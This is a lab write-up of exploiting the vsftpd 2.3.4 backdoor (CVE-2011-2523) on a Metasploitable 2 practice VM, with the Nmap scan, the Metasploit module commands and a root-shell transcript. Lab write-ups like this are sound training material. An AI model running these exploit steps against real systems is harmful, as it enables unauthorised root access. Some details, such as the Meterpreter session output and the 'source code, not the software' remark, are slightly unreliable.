# vsftpd 2.3.4 Backdoor — Metasploitable 2

**Target:** Metasploitable 2 (192.168.1.91)  
**Attacker:** Kali Linux (192.168.1.80)  
**CVE:** CVE-2011-2523  
**Difficulty:** Easy  
**Tool:** Metasploit Framework

---

## Overview

vsftpd 2.3.4 was a widely used FTP server that had a backdoor introduced into its source code in 2011. When a username containing `:)` is sent, the server opens a root shell on port 6200. Metasploit has a module that automates this.

---

## Recon

Ran Nmap to discover open ports and services:

```bash
nmap -sV 192.168.1.91
```

Found vsftpd 2.3.4 running on port 21 — a known vulnerable version.

---

## Exploitation

Opened Metasploit and loaded the vsftpd backdoor module:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.91
set LHOST 192.168.1.80
run
```

Metasploit triggered the backdoor by sending a malformed username, which caused the server to open a shell on port 6200.

---

## Result

```
[+] 192.168.1.91:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened
meterpreter > shell
whoami
root
```

Got a root shell on the target machine through the FTP backdoor.

---

## What I Learned

- How to use Nmap to identify vulnerable service versions
- How supply chain attacks work — the vsftpd backdoor was injected into the source code, not the software itself
- How to use Metasploit to load, configure, and run an exploit module
- How Meterpreter sessions work and how to drop into a system shell
